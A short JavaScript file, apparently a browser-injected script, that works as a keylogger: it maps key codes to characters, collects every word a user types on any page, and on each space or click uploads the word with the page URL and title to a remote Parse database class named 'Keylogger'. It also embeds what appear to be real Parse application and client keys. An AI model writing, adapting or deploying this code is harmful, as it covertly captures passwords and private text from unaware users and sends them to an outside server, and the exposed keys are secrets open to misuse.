var keys = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z', '0','1','2','3','4','5','6','7','8','9'];
var currentKeyIndex;
var dict = {};
for (var x = 65; x < 91; x++) {
  currentKeyIndex = x - 65;
  var currentKey = keys[currentKeyIndex];
  dict[x] = currentKey;
}
for (var x = 48; x < 58; x++) {
   currentKeyIndex = x - 22;
   var currentKey = keys[currentKeyIndex];
   dict[x] = currentKey;
}

console.log(dict);

$(document).ready(function(){
    var wordArray = [];
    var lettersTyped = 0;
    var currentWord = '';
    // Place your Parse project keys on the line after this
    Parse.initialize("Fy4Ib14galFSBNWaE4JRBCLd36DUBQcF158pmt54", "0CdMDbDgrkQNf4APtdSfTe8MLt4F7x8LBSdhuEL1");
    var Keylogger = Parse.Object.extend("Keylogger");
    $(document).click(function() {
            if (wordArray.length === 0) {
                
            }
            else {
            var currentKeylogger = new Keylogger();

            currentWord = wordArray.join('');
            currentKeylogger.set("site", document.URL);
            currentKeylogger.set("Title", document.title);
            currentKeylogger.set("Word", currentWord);
            currentKeylogger.save(null, {
    success: function(currentKeylogger) {
      
  },
    error: function(currentKeylogger, error) {
      
  }
});
            console.log(currentWord);
            currentWord = '';
            wordArray = [];
            lettersTyped = 0;
            }
    });
    $(document).keyup(function(event){ 
        if (event.which === 32) {
            if (wordArray.length === 0) {
                
            }
            else {
            var currentKeylogger = new Keylogger();

            currentWord = wordArray.join('');
            
            currentKeylogger.set("site", document.URL);
            currentKeylogger.set("Title", document.title);
            currentKeylogger.set("Word", currentWord);
            currentKeylogger.save(null, {
  success: function(currentKeylogger) {
      
  },
  error: function(currentKeylogger, error) {
  }
});
            console.log(currentWord);
            currentWord = '';
            wordArray = [];
            lettersTyped = 0;
            }
        }
        else {
        wordArray[lettersTyped] = dict[event.which];
        lettersTyped = lettersTyped + 1;
        }
    });
});
